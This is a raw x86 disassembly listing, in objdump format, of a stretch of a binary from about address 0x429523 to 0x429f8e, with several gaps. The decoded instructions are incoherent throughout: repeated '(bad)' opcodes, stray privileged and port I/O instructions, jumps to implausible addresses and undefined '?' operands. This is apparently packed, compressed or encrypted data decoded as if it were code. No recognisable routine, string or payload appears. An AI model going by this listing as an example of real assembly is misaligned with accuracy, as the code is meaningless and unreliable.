  429523:	pop    edx
  429524:	mov    bh,0xb7
  429526:	push   edx
  429527:	out    0x38,al
  429529:	xbegin 0xe9881e64
  42952f:	lds    esi,FWORD PTR gs:[edi]
  429532:	pop    ds
  429533:	mov    edx,0x781f0858
  429538:	jo     0x42956b
  42953a:	fs push ds
  42953c:	hlt    
  42953d:	sti    
  42953e:	cdq    
  42953f:	fcomi  st,st(5)
  429541:	cmc    
  429542:	fwait
  429543:	scas   eax,DWORD PTR es:[edi]
  429544:	mov    eax,0x54f686b
  429549:	dec    ecx
  42954a:	add    eax,0x7edc8a12
  42954f:	push   ss
  429550:	inc    ecx
  429551:	clc    
  429552:	cld    
  429553:	sbb    DWORD PTR [esi+edx*1-0x1e],0x35
  429558:	or     DWORD PTR [edi-0x52ded647],0xc0758bc3
  429562:	xor    eax,0xff6cbf56
  429567:	jmp    0xa379f02e
  42956c:	xchg   ecx,eax
  42956d:	leave  
  42956e:	aas    
  42956f:	mov    DWORD PTR [edi+0x61],eax
  429572:	mov    ebp,0xbda06624
  429577:	sbb    ah,ah
  429579:	outs   dx,BYTE PTR ds:[esi]
  42957a:	cld    
  42957b:	loop   0x4295dc
  42957d:	sbb    esp,eax
  42957f:	mov    ebx,DWORD PTR [edx]
  429581:	(bad)  
  429583:	pop    esi
  429584:	fcomp  QWORD PTR [ebp-0x397bf718]
  42958a:	xchg   edi,eax
  42958b:	xor    al,BYTE PTR [edi]
  42958d:	mov    ebp,0x900bb061
  429592:	int3   
  429593:	call   ebp
  429595:	or     al,dh
  429597:	into   
  429598:	out    dx,eax
  429599:	jb     0x4295d1
  42959b:	fwait
  42959c:	in     eax,dx
  42959d:	jno    0x42957a
  42959f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4295a0:	add    ecx,0x71
  4295a3:	ds xor dl,bh
  4295a6:	test   dh,ch
  4295a8:	jbe    0x429585
  4295aa:	ins    BYTE PTR es:[edi],dx
  4295ab:	xchg   ebx,eax
  4295ac:	dec    ebp
  4295ad:	test   BYTE PTR [eax],ah
  4295af:	xchg   ebp,eax
  4295b0:	add    al,0x23
  4295b2:	(bad)  
  4295b3:	pop    edx
  4295b4:	dec    ecx
  4295b5:	stc    
  4295b6:	les    ecx,FWORD PTR [ebx+ebx*1+0x40]
  4295ba:	jecxz  0x4295ae
  4295bc:	inc    ebp
  4295bd:	add    cl,0xaf
  4295c0:	or     DWORD PTR ds:0x64c455a0,esp
  4295c6:	and    eax,0x70569efe
  4295cb:	mov    WORD PTR ss:[edi+0x63],ds
  4295cf:	cwde   
  4295d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295d1:	rol    DWORD PTR [esi+eiz*1],1
  4295d4:	std    
  4295d5:	pop    esi
  4295d6:	inc    ecx
  4295d7:	sub    al,0x1b
  4295d9:	pop    eax
  4295da:	push   ds
  4295db:	fnsave [esi]
  4295dd:	cs pop es
  4295df:	cmp    BYTE PTR [esi+0x5e465d71],ch
  4295e5:	xor    eax,0xc901da5b
  4295ea:	test   BYTE PTR [ecx+0x39],bh
  4295ed:	push   edx
  4295ee:	adc    eax,0x619de8ff
  4295f3:	jg     0x429632
  4295f5:	(bad)  
  4295f6:	mov    al,ds:0xb7421741
  4295fb:	pusha  
  4295fc:	dec    edi
  4295fd:	and    eax,0xd0fff46
  429602:	and    DWORD PTR [ebx+edx*4+0x1b74992],0xffffffc9
  42960a:	addps  xmm6,XMMWORD PTR [ecx+0x6ff263d]
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429681:	sub    BYTE PTR [eax],ah
  429683:	fcom   QWORD PTR [ebp-0x45]
  429686:	add    DWORD PTR [eax],eax
  429688:	add    eax,0x4000001
  42968d:	and    ah,BYTE PTR [esi]
  42968f:	sar    BYTE PTR [ebp+0x227bad17],1
  429695:	out    0xfb,al
  429697:	mov    ebx,0xc4f7f2ba
  42969c:	test   al,0xc9
  42969e:	inc    ecx
  42969f:	in     eax,0x88
  4296a1:	(bad)  
  4296a2:	mov    bl,0xc
  4296a4:	sub    dh,BYTE PTR [ebx-0x43d6d67d]
  4296aa:	jo     0x429646
  4296ac:	rcr    ebp,cl
  4296ae:	aad    0x8e
  4296b0:	ja     0x4296bd
  4296b2:	adc    BYTE PTR [eax+0x5],0x8f
  4296b6:	(bad)  
  4296b7:	jl     0x429673
  4296b9:	dec    esi
  4296ba:	pop    edx
  4296bb:	sbb    ch,BYTE PTR [esp+ebx*1+0x5d]
  4296bf:	dec    edx
  4296c0:	jmp    0x429741
  4296c2:	enter  0x96b5,0x4f
  4296c6:	inc    ebp
  4296c7:	ins    BYTE PTR es:[edi],dx
  4296c8:	mov    eax,cs
  4296ca:	ret    0x6f5b
  4296cd:	xchg   BYTE PTR [edi+eax*2],ch
  4296d0:	pop    es
  4296d1:	and    eax,0x1f98eb20
  4296d6:	xchg   ebx,eax
  4296d7:	jo     0x42973f
  4296d9:	mov    ch,0x97
  4296db:	nop
  4296dc:	push   0xb8c49bf9
  4296e1:	or     BYTE PTR [ecx+0x2],al
  4296e4:	xchg   edi,eax
  4296e5:	fisubr DWORD PTR [ecx-0x569761d4]
  4296eb:	stc    
  4296ec:	jmp    0x42967f
  4296ee:	sbb    al,0x22
  4296f0:	mov    eax,0xf158c5c6
  4296f5:	add    DWORD PTR [ecx-0x7e],ebx
  4296f8:	cmp    al,0xe0
  4296fa:	pop    ss
  4296fb:	push   ds
  4296fc:	inc    ebp
  4296fd:	pop    edx
  4296fe:	cmp    bh,BYTE PTR [eax-0x27]
  429701:	mov    dh,0x22
  429703:	dec    edi
  429704:	xchg   esi,eax
  429705:	add    eax,0x29b515a2
  42970a:	cmp    eax,0xd5ac29cb
  42970f:	cmc    
  429710:	xor    DWORD PTR [edx-0x61],ebx
  429713:	sbb    edx,ecx
  429715:	inc    edi
  429716:	jae    0x4296ad
  429718:	dec    eax
  429719:	pop    esp
  42971a:	mov    esp,0x74d6676a
  42971f:	stc    
  429720:	mov    ebx,0x3dbe64b4
  429725:	mov    dl,0xf5
  429727:	mov    esp,eax
  429729:	lds    ebx,FWORD PTR ds:0x3c82f8bc
  42972f:	jnp    0x42975f
  429731:	div    BYTE PTR [edi+edi*1+0x7c]
  429735:	inc    ebp
  429736:	xor    al,0x49
  429738:	mov    edx,0xe3a16254
  42973d:	stos   DWORD PTR es:[edi],eax
  42973e:	adc    DWORD PTR [esi],0xea80bcd6
  429744:	ret    0x48d8
  429747:	ss and al,0xc
  42974a:	pushf  
  42974b:	adc    al,0x73
  42974d:	sbb    eax,0x4d6fbd7b
  429752:	sbb    ah,BYTE PTR ds:0x11b51948
  429758:	pop    ebp
  429759:	sbb    ecx,DWORD PTR [ecx+ebx*8-0x6c]
  42975d:	push   esp
  42975e:	adc    al,0xd8
  429760:	or     eax,DWORD PTR [ebx-0x8ffa599]
  429766:	imul   ebx,DWORD PTR [eax],0x69
  429769:	int3   
  42976a:	retf   0x9102
  42976d:	pop    eax
  42976e:	(bad)  
  42976f:	or     eax,0x59885a62
  429774:	add    BYTE PTR [edx+0x74158da8],bl
  42977a:	push   eax
  42977b:	idiv   BYTE PTR [edi-0x4f]
  42977e:	loop   0x429779
  429780:	popa   
  429781:	and    ebp,DWORD PTR [ebp+0x5bfa1929]
  429787:	je     0x429727
  429789:	psubsw mm0,mm3
  42978c:	pop    ebp
  42978d:	shufps xmm3,XMMWORD PTR [edx+eax*4+0x0],0x0
	...
  4297f2:	add    BYTE PTR [eax],al
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	and    ebp,DWORD PTR [edx]
  429802:	mov    eax,0x1bc5a46
  429807:	add    BYTE PTR ds:0x4e000001,al
  42980d:	xor    BYTE PTR [ecx+edx*8-0x6a51a93a],0xfc
  429815:	sub    al,0x5a
  429817:	cmp    BYTE PTR [ebx-0x4894503f],al
  42981d:	xor    esp,edi
  42981f:	push   ebp
  429820:	cmp    edx,esi
  429822:	or     bh,BYTE PTR [ebx]
  429824:	retf   
  429825:	mov    gs,WORD PTR [ecx]
  429827:	shl    BYTE PTR [esi+edx*2+0x25],0xcd
  42982c:	sub    al,0x8
  42982e:	rol    BYTE PTR [ebp+0x3],1
  429831:	pop    ecx
  429832:	xchg   edx,eax
  429833:	rol    DWORD PTR ds:0xf1b3e7ed,0xa0
  42983a:	xchg   ebp,eax
  42983b:	dec    esi
  42983c:	retf   0x7b70
  42983f:	adc    BYTE PTR [edi+0x65],dh
  429842:	fild   DWORD PTR [edx+0x24acc2fc]
  429848:	(bad)  
  429849:	dec    ebx
  42984a:	push   0x2a
  42984c:	or     eax,0x43581015
  429851:	dec    edx
  429852:	xor    eax,0x1cf4845e
  429857:	hlt    
  429858:	repz add al,0x71
  42985b:	ja     0x429874
  42985d:	loop   0x42985a
  42985f:	mov    ch,0x9
  429861:	ins    DWORD PTR es:[edi],dx
  429862:	ret    0xe997
  429865:	xor    al,0x34
  429867:	popa   
  429868:	xchg   esi,eax
  429869:	and    cl,BYTE PTR [ebx+0x2b7e8dc1]
  42986f:	and    al,ch
  429871:	add    esi,DWORD PTR [ebx+edi*2+0x854e400]
  429878:	sbb    DWORD PTR [edi],0x66298877
  42987e:	mov    ds:0xc2313846,al
  429883:	xor    eax,0x9e0e7474
  429888:	mov    esi,0x60f600df
  42988d:	adc    esp,DWORD PTR [edx]
  42988f:	cmp    eax,0xca3da011
  429894:	sbb    BYTE PTR [ecx-0x5d53b5d8],ah
  42989a:	in     eax,0x53
  42989c:	add    edi,ecx
  42989e:	stos   BYTE PTR es:[edi],al
  42989f:	cwde   
  4298a0:	mov    edx,0x9454a0a5
  4298a5:	pop    edi
  4298a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298a7:	mov    DWORD PTR [ebp-0x7d2b0d38],edx
  4298ad:	cmp    ecx,DWORD PTR [edi]
  4298af:	xor    dh,ch
  4298b1:	cmc    
  4298b2:	inc    ecx
  4298b3:	push   ebp
  4298b4:	push   ecx
  4298b5:	aas    
  4298b6:	xchg   esp,eax
  4298b7:	dec    esi
  4298b8:	lods   al,BYTE PTR ds:[esi]
  4298b9:	mov    DWORD PTR [edi+0x5aee450],edx
  4298bf:	repnz mov edi,0x7cd7c6f3
  4298c5:	test   eax,0xd6c8c53d
  4298ca:	mov    WORD PTR [ecx+ecx*2],?
  4298cd:	adc    eax,0x57d254d6
  4298d2:	rcr    BYTE PTR [ecx+0x12dd66ce],cl
  4298d8:	dec    ebx
  4298d9:	ficom  DWORD PTR [esi+edx*2+0x4ce7ff75]
  4298e0:	fild   WORD PTR [esi+0x32]
  4298e3:	pop    ss
  4298e4:	retf   0x4b5e
  4298e7:	push   cs
  4298e8:	xchg   ebx,eax
  4298e9:	neg    ecx
  4298eb:	shr    DWORD PTR [ecx*2-0x389a1456],0xc9
  4298f3:	jns    0x429901
  4298f5:	cmp    dl,BYTE PTR [eax+0x4b09ca63]
  4298fb:	jae    0x429908
  4298fd:	pop    esp
  4298ff:	into   
  429900:	ins    DWORD PTR es:[edi],dx
  429901:	adc    DWORD PTR [eax],0x1cab0db0
  429907:	jmp    0x3f03:0x3107e818
  42990e:	fcmovnbe st,st(6)
  429910:	push   ecx
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	cmp    ebx,DWORD PTR [edx-0x42a0b345]
  429986:	add    DWORD PTR [eax],eax
  429988:	add    eax,0xe1000001
  42998d:	stos   BYTE PTR es:[edi],al
  42998e:	cmp    BYTE PTR [ebx-0x23],al
  429991:	cmp    al,0xc9
  429993:	and    DWORD PTR ss:[ecx+0x1a745709],esp
  42999a:	push   es
  42999b:	jmp    0x8c4c3cb8
  4299a0:	xor    eax,0x21e0f6b3
  4299a5:	push   ebx
  4299a6:	aam    0xb
  4299a8:	sar    DWORD PTR [ecx],0xd4
  4299ab:	rcr    BYTE PTR [edx],1
  4299ad:	xor    DWORD PTR [edi-0x12],ebp
  4299b0:	into   
  4299b1:	into   
  4299b2:	fcomip st,st(4)
  4299b4:	gs sahf 
  4299b6:	cmp    al,0x90
  4299b8:	xchg   esp,eax
  4299b9:	push   edi
  4299ba:	sbb    al,0x88
  4299bc:	mov    ebp,DWORD PTR [ebx-0x13f66978]
  4299c2:	stos   BYTE PTR es:[edi],al
  4299c3:	push   ecx
  4299c4:	rcr    DWORD PTR [ebp+0x681bba52],0x62
  4299cb:	das    
  4299cc:	sub    al,0xae
  4299ce:	dec    esp
  4299cf:	cmc    
  4299d0:	sub    ecx,ebx
  4299d2:	leave  
  4299d3:	fist   WORD PTR [edi-0x4825d78b]
  4299d9:	mov    ?,WORD PTR [edx-0x36c50322]
  4299df:	mov    ebx,0xb3cb0180
  4299e4:	hlt    
  4299e5:	dec    ecx
  4299e6:	xchg   eax,ebx
  4299e8:	or     DWORD PTR [esi+esi*8+0x27],edi
  4299ec:	not    BYTE PTR ds:0x1e5081f6
  4299f2:	div    DWORD PTR [edi+0x506514ac]
  4299f8:	inc    esi
  4299f9:	push   edi
  4299fa:	test   al,0x6
  4299fc:	jns    0x4299fb
  4299fe:	mov    dh,0x68
  429a00:	scas   al,BYTE PTR es:[edi]
  429a01:	push   ss
  429a02:	ror    al,1
  429a04:	(bad)  
  429a06:	sbb    eax,0x415befe1
  429a0b:	cmp    DWORD PTR [eax],ebx
  429a0d:	mov    ecx,0xf192bcc8
  429a12:	push   ss
  429a13:	xor    DWORD PTR [edx-0x6],eax
  429a16:	mov    ch,BYTE PTR [eax-0x3aa831aa]
  429a1c:	jne    0x4299d0
  429a1e:	add    eax,0x738b16c1
  429a23:	test   edx,esi
  429a25:	cs (bad) 
  429a27:	stos   DWORD PTR es:[edi],eax
  429a28:	push   ss
  429a29:	(bad)  [edi+0x454484b]
  429a2f:	xchg   edx,eax
  429a30:	test   al,0xbd
  429a32:	jns    0x429a49
  429a34:	cli    
  429a35:	adc    DWORD PTR [edx],0x3b
  429a38:	popa   
  429a39:	xlat   BYTE PTR ds:[ebx]
  429a3a:	into   
  429a3b:	in     al,dx
  429a3c:	pop    esi
  429a3d:	jnp    0x429a22
  429a3f:	ds mov edx,0xdef75427
  429a45:	pop    ebx
  429a46:	mov    ebx,DWORD PTR [ecx+edi*1]
  429a49:	ins    DWORD PTR es:[edi],dx
  429a4a:	mov    esi,0xf9045257
  429a4f:	scas   eax,DWORD PTR es:[edi]
  429a50:	mov    ah,0xbf
  429a52:	(bad)  
  429a53:	cs xor eax,0xdf9ea39
  429a59:	ror    BYTE PTR [ebx+eax*2+0x60],1
  429a5d:	into   
  429a5e:	pop    ds
  429a5f:	jbe    0x429a0f
  429a61:	pop    ds
  429a62:	repnz cld 
  429a64:	ret    0x502f
  429a67:	jnp    0x429a69
  429a69:	js     0x4299fc
  429a6b:	jle    0x429a30
  429a6d:	mov    esp,0x110c65a5
  429a72:	imul   esi,DWORD PTR [ecx],0x8ee03aab
  429a78:	cs sbb dh,ah
  429a7b:	add    bh,0x38
  429a7e:	cld    
  429a7f:	scas   eax,DWORD PTR es:[edi]
  429a80:	div    DWORD PTR [ecx+edx*1-0x17b4bd02]
  429a87:	dec    eax
  429a88:	sbb    al,0x3f
  429a8a:	outs   dx,BYTE PTR ds:[esi]
  429a8b:	cmp    BYTE PTR [ebx-0x70c56018],dl
	...
  429af1:	add    BYTE PTR [eax],al
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x3ba95667
  429b01:	sahf   
  429b02:	pop    edi
  429b03:	test   DWORD PTR [esi+edi*4+0x1],esp
  429b07:	add    BYTE PTR ds:0xa0000001,al
  429b0d:	xchg   DWORD PTR [edx-0x3c],eax
  429b10:	pusha  
  429b11:	int3   
  429b12:	mov    BYTE PTR [edi],ch
  429b14:	in     eax,dx
  429b15:	mov    ebp,0x4b4c96f3
  429b1a:	(bad)  [edi+0x13]
  429b1d:	ss push esp
  429b1f:	imul   esi,ebx,0xfffffff3
  429b22:	push   edx
  429b23:	daa    
  429b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b25:	ds adc eax,ebx
  429b28:	inc    eax
  429b29:	pop    ds
  429b2a:	aad    0xc1
  429b2c:	jmp    0x1d1969df
  429b31:	inc    edi
  429b32:	pop    ebx
  429b33:	test   edx,0x969f07bd
  429b39:	sub    BYTE PTR [esi],0x56
  429b3c:	inc    edi
  429b3d:	dec    ebx
  429b3e:	cwde   
  429b3f:	aad    0x0
  429b41:	cmp    al,0xfa
  429b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429b44:	jle    0x429bc4
  429b46:	aam    0xa5
  429b48:	mov    al,ds:0xffce2747
  429b4d:	jo     0x429b48
  429b4f:	xchg   esi,eax
  429b50:	jmp    0x429b26
  429b52:	mov    al,ds:0x1b65ee31
  429b57:	jns    0x429b9d
  429b59:	icebp  
  429b5a:	pause  
  429b5c:	jl     0x429b5c
  429b5e:	inc    ebx
  429b5f:	adc    DWORD PTR [edx-0x7],ebx
  429b62:	iret   
  429b63:	inc    ebx
  429b64:	xchg   BYTE PTR [eax-0x2a],ah
  429b67:	xor    al,0x7f
  429b69:	lds    ecx,FWORD PTR [esi+eax*2-0x542be92e]
  429b70:	pop    ds
  429b71:	or     DWORD PTR ds:0x8291d12b,0x2f4e92c7
  429b7b:	fidivr DWORD PTR [edx]
  429b7d:	lds    ebx,FWORD PTR [ebx-0x22]
  429b80:	sar    esi,0x40
  429b83:	pop    es
  429b84:	jb     0x429bb0
  429b86:	mov    ebx,0xef4b8459
  429b8b:	(bad)  
  429b8c:	(bad)  [eax+esi*4+0x707a9034]
  429b93:	xchg   edx,eax
  429b94:	call   0x848e4fde
  429b99:	pop    esp
  429b9a:	in     eax,dx
  429b9b:	sti    
  429b9c:	xlat   BYTE PTR ds:[ebx]
  429b9d:	(bad)  
  429b9e:	(bad)  
  429b9f:	jle    0x429b24
  429ba1:	sti    
  429ba2:	in     eax,0x8c
  429ba4:	and    DWORD PTR [edi+eiz*1],ebx
  429ba7:	and    cl,BYTE PTR [edx-0x515d8cc4]
  429bad:	xchg   ch,ch
  429baf:	out    0x9a,eax
  429bb1:	pop    esp
  429bb2:	and    cl,BYTE PTR [ebx+0x147f8ed5]
  429bb8:	pop    ecx
  429bb9:	xchg   DWORD PTR [edx-0x4058da0c],eax
  429bbf:	mov    ds:0xa2fd5d59,al
  429bc4:	hlt    
  429bc5:	xchg   edi,eax
  429bc6:	imul   esi,DWORD PTR [edx-0x1c7722a7],0x2d
  429bcd:	std    
  429bce:	out    dx,eax
  429bcf:	int3   
  429bd0:	pop    esi
  429bd1:	mov    al,ds:0x1ce8a3ab
  429bd6:	sub    bh,BYTE PTR [eax]
  429bd8:	xchg   esi,eax
  429bd9:	pop    edi
  429bda:	out    dx,eax
  429bdb:	pop    esp
  429bdc:	cmp    dh,BYTE PTR [esi+eiz*4-0x23]
  429be0:	mov    ds:0xcea8e580,eax
  429be5:	pop    ebp
  429be6:	scas   al,BYTE PTR es:[edi]
  429be7:	mov    WORD PTR [ebx-0x7b],es
  429bea:	ja     0x429b93
  429bec:	and    esp,edx
  429bee:	adc    edx,DWORD PTR [ecx]
  429bf0:	pop    ecx
  429bf1:	sbb    eax,0x5e602113
  429bf6:	cmp    ebp,esi
  429bf8:	and    al,0x86
  429bfa:	int3   
  429bfb:	fistp  WORD PTR [edx-0x51658712]
  429c01:	dec    edi
  429c02:	sub    esp,ecx
  429c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429c05:	sbb    DWORD PTR [ebx+ebx*4-0x35feb705],ebx
  429c0c:	shl    DWORD PTR [ebx+0x9f1e19],1
	...
  429c72:	add    BYTE PTR [eax],al
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    bl,al
  429c81:	push   esi
  429c82:	push   ebp
  429c83:	mov    ds:0x1bf69,al
  429c88:	add    eax,0xe6000001
  429c8d:	or     eax,0xaa4ec52d
  429c92:	scas   eax,DWORD PTR es:[edi]
  429c93:	jg     0x429ce2
  429c95:	adc    eax,0x9151c8a1
  429c9a:	push   edi
  429c9b:	in     al,0x4e
  429c9d:	xor    DWORD PTR [edx+ecx*8],esp
  429ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ca1:	or     DWORD PTR [ebp-0xbb11877],eax
  429ca7:	xchg   esi,eax
  429ca8:	mov    edx,0x4601384d
  429cad:	xchg   BYTE PTR [edx-0x5bb1a5b2],bh
  429cb3:	ror    BYTE PTR [esi+0x63],1
  429cb6:	in     al,dx
  429cb7:	mov    bh,0x9f
  429cb9:	test   DWORD PTR [ebx-0x2a],edx
  429cbc:	mov    DWORD PTR [esi-0x65],0x10b0778c
  429cc3:	retf   
  429cc4:	test   eax,0x3bcf746e
  429cc9:	in     eax,dx
  429cca:	pushf  
  429ccb:	jl     0x429c87
  429ccd:	das    
  429cce:	pop    ebx
  429ccf:	pop    esi
  429cd0:	adc    ebp,eax
  429cd2:	push   ds
  429cd3:	rol    esp,1
  429cd5:	pop    ebp
  429cd6:	fnstenv [edx+0x2]
  429cd9:	je     0x429c82
  429cdb:	ret    0x53de
  429cde:	sti    
  429cdf:	pushf  
  429ce0:	xor    ecx,DWORD PTR [esp+ebx*1-0x5b]
  429ce4:	pop    ds
  429ce5:	jl     0x429d5f
  429ce7:	mov    ecx,0x50edbc67
  429cec:	cs push ebp
  429cee:	dec    esp
  429cef:	fisttp DWORD PTR [ebx-0x1f]
  429cf2:	cmc    
  429cf3:	enter  0xdf02,0xb9
  429cf7:	jge    0x429d16
  429cf9:	shl    cl,cl
  429cfb:	pop    edx
  429cfc:	push   es
  429cfd:	icebp  
  429cfe:	adc    ebx,edi
  429d00:	mov    WORD PTR [ebx],ss
  429d02:	add    eax,0xf90db46c
  429d07:	jb     0x429d72
  429d09:	cld    
  429d0a:	sbb    eax,0xd5e5ff50
  429d0f:	popf   
  429d10:	sub    esi,DWORD PTR [eax]
  429d12:	lds    edi,FWORD PTR [edi+esi*1]
  429d15:	or     dh,BYTE PTR [ebx+eiz*4+0x34]
  429d19:	mov    BYTE PTR ds:0x1fbd1a0,dh
  429d1f:	jg     0x429d4c
  429d21:	pushf  
  429d22:	pushf  
  429d23:	cmp    eax,0x57972560
  429d28:	test   al,0x20
  429d2a:	sub    eax,0xc60ae2e2
  429d2f:	jae    0x429ce1
  429d31:	(bad)  
  429d32:	and    ch,ch
  429d34:	mov    eax,ds:0xe0450f
  429d39:	shl    BYTE PTR [ebp+0x414a2c44],1
  429d3f:	test   BYTE PTR [edi],dh
  429d41:	ins    DWORD PTR es:[edi],dx
  429d42:	add    ch,ch
  429d44:	or     al,0xae
  429d46:	sbb    edi,DWORD PTR [edi+0x3]
  429d49:	inc    ecx
  429d4a:	mov    WORD PTR [eax],gs
  429d4c:	mov    esp,0x817779e0
  429d51:	and    al,0xa
  429d53:	mov    WORD PTR [ebp-0x50],ds
  429d56:	adc    DWORD PTR [edi],ebx
  429d58:	add    BYTE PTR [eax+ebx*4-0x53],dh
  429d5c:	inc    edx
  429d5d:	dec    edx
  429d5e:	retf   0xd56
  429d61:	or     al,0x86
  429d63:	mul    dh
  429d65:	mov    dh,0x95
  429d67:	aad    0xe4
  429d69:	hlt    
  429d6a:	push   eax
  429d6b:	or     ebx,DWORD PTR [eax+0x23]
  429d6e:	pop    esp
  429d6f:	mov    cl,0x12
  429d71:	sub    BYTE PTR [ecx-0x5],0xa9
  429d75:	outs   dx,DWORD PTR ds:[esi]
  429d76:	sub    eax,0xa16d55b1
  429d7b:	push   ebp
  429d7c:	mov    esi,0x29d3540
  429d81:	add    DWORD PTR [esi+edx*4+0x5bbac182],esi
  429d88:	stc    
  429d89:	out    dx,al
  429d8a:	aas    
  429d8b:	clc    
  429d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429d8d:	shr    DWORD PTR ds:0x62b7,cl
	...
  429df3:	add    BYTE PTR [ebx-0x13f33b49],bl
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	std    
  429e01:	jne    0x429db3
  429e03:	jne    0x429e73
  429e05:	rol    BYTE PTR [ecx],0x0
  429e08:	add    eax,0x98000001
  429e0d:	cmp    BYTE PTR [edi-0x2b8c81bf],cl
  429e13:	mov    WORD PTR [esi+0x731ff557],fs
  429e19:	xchg   edx,eax
  429e1a:	and    bl,ch
  429e1c:	xchg   BYTE PTR [esi],bh
  429e1e:	sbb    eax,DWORD PTR [edx+0x685624ae]
  429e24:	jg     0x429db2
  429e26:	pusha  
  429e27:	lahf   
  429e28:	dec    DWORD PTR [ecx]
  429e2a:	add    al,BYTE PTR [ebp-0x7afcdd89]
  429e30:	fwait
  429e31:	cdq    
  429e32:	stos   BYTE PTR es:[edi],al
  429e33:	adc    al,0xd4
  429e35:	mov    ah,0x6f
  429e37:	in     al,0x67
  429e39:	mov    ebp,ss
  429e3b:	bound  ebp,QWORD PTR [ecx]
  429e3d:	xor    edi,esi
  429e3f:	and    esp,DWORD PTR [si-0x5b]
  429e43:	jmp    0x30859cbc
  429e48:	out    0xc1,eax
  429e4a:	jne    0x429e94
  429e4c:	mov    eax,esi
  429e4e:	aad    0x63
  429e50:	out    0x66,eax
  429e52:	push   esp
  429e53:	arpl   WORD PTR [ecx-0xc],bp
  429e56:	fwait
  429e57:	in     eax,dx
  429e58:	or     DWORD PTR [edx],edx
  429e5a:	fwait
  429e5b:	out    dx,al
  429e5c:	test   cl,0xaf
  429e5f:	pop    esi
  429e60:	jle    0x429e90
  429e62:	leave  
  429e63:	push   ss
  429e64:	jp     0x429ed5
  429e66:	push   0x4f
  429e68:	mov    esi,DWORD PTR [edx-0x30]
  429e6b:	cdq    
  429e6c:	push   0xffffff86
  429e6e:	sbb    ecx,DWORD PTR [ebp+0x47]
  429e71:	aam    0x48
  429e73:	cdq    
  429e74:	(bad)  
  429e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e76:	aad    0x91
  429e78:	pop    ebx
  429e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e7a:	fstp   QWORD PTR [edx]
  429e7c:	jo     0x429ebe
  429e7e:	pop    edx
  429e7f:	ror    DWORD PTR [eax-0x1f7c088],0xa8
  429e86:	inc    esi
  429e87:	(bad)  
  429e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e89:	int3   
  429e8a:	int    0x37
  429e8c:	gs ins DWORD PTR es:[edi],dx
  429e8e:	mov    ah,0x74
  429e90:	test   bl,ah
  429e92:	pop    esp
  429e94:	(bad)  
  429e96:	lods   al,BYTE PTR ds:[esi]
  429e97:	adc    DWORD PTR [ecx],0xffffffbe
  429e9a:	xor    eax,0x7a1aab2f
  429e9f:	jne    0x429e8b
  429ea1:	cld    
  429ea2:	or     BYTE PTR [ebx+0x5c],ah
  429ea5:	cs stos DWORD PTR es:[edi],eax
  429ea7:	in     eax,0x1
  429ea9:	mov    edi,0x95e6e79f
  429eae:	fidiv  WORD PTR [eax+0x62a6e247]
  429eb4:	sub    al,BYTE PTR [esi-0x5e]
  429eb7:	inc    edx
  429eb8:	das    
  429eb9:	les    esp,FWORD PTR [esi+0x7143a99d]
  429ebf:	in     eax,0x13
  429ec1:	xchg   ecx,eax
  429ec2:	daa    
  429ec3:	mov    WORD PTR [edi+0x3b],ss
  429ec6:	loope  0x429ec9
  429ec8:	repnz shl BYTE PTR [esi+0x64],1
  429ecc:	push   eax
  429ecd:	fidivr WORD PTR [esi+0x4d]
  429ed0:	push   cs
  429ed1:	ror    BYTE PTR [esi-0x3a3ebaef],0xef
  429ed8:	sti    
  429ed9:	mov    ebp,DWORD PTR [ebx]
  429edb:	out    dx,eax
  429edc:	ins    DWORD PTR es:[edi],dx
  429edd:	into   
  429ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429edf:	xlat   BYTE PTR ds:[ebx]
  429ee0:	in     al,dx
  429ee1:	jo     0x429f1e
  429ee3:	lds    ecx,FWORD PTR [ebp+0x54e005c7]
  429ee9:	psubd  mm5,QWORD PTR cs:[eax-0x54ccba49]
  429ef1:	call   FWORD PTR [ecx+0x16]
  429ef4:	pop    es
  429ef5:	sahf   
  429ef6:	nop
  429ef7:	pushf  
  429ef8:	mov    bh,0x94
  429efa:	arpl   WORD PTR [ebx-0x56],ax
  429efd:	test   DWORD PTR [ebx-0x3809fdc],0x43a4f33
  429f07:	mov    dh,0x40
  429f09:	inc    edi
  429f0a:	sub    edi,edx
  429f0c:	jg     0x429eab
  429f0e:	shr    ebx,0x20
	...
  429f71:	add    BYTE PTR [eax],al
  429f73:	add    BYTE PTR [ecx],dh
  429f75:	inc    ebp
  429f76:	enter  0xfc06,0x8f
  429f7a:	push   DWORD PTR [edi-0x50]
  429f7d:	cld    
  429f7e:	sbb    esp,DWORD PTR [ebx-0x3fe6be9]
  429f84:	jae    0x429f47
  429f86:	add    DWORD PTR [eax],eax
  429f88:	add    eax,0xfc000001
  429f8d:	push   eax
  429f8e:	add    bl,bh
